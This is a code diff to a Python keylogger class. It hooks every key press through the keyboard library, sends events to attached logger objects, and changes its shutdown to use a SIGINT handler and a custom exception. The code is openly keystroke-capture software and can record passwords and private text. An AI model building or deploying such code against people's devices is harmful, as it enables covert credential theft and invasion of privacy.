@@ -1,9 +1,13 @@
-import threading
 import time
+import signal
 
 import keyboard
 
 import logger
+
+
+class KeyloggerInterruptException(Exception):
+    pass
 
 
 class Keylogger:
@@ -12,6 +16,9 @@ class Keylogger:
 
         # log each key pressed
         keyboard.hook(callback=self._on_event)
+
+        # safely shut down the keylogger
+        signal.signal(signal.SIGINT, self.shutdown)
         
     def attach_logger(self, logger: logger.AbstractLogger):
         self.__loggers.append(logger)
@@ -20,25 +27,21 @@ class Keylogger:
 
     def detach_logger(self, logger: logger.AbstractLogger):
         self.__loggers.remove(logger)
-        logger.on_detached()
+        logger.close()
         return self
 
     def wait(self):
-        if len(self.__loggers) == 0:
-            raise Exception('No logger attached')
-
         try:
             while True:
                 time.sleep(1e6)
-        except Exception as e:
-            self.log_object(e)
-            self.stop()
-        except KeyboardInterrupt:
-            self.stop()
+        except KeyloggerInterruptException:
+            pass
 
-    def stop(self):
-        for logger in self.__loggers:
+    def shutdown(self, *_):
+        while len(self.__loggers) > 0:
+            logger = self.__loggers.pop()
             logger.close()
+        raise KeyloggerInterruptException()
 
     def _on_event(self, event: keyboard.KeyboardEvent):
         if event.event_type == 'down':
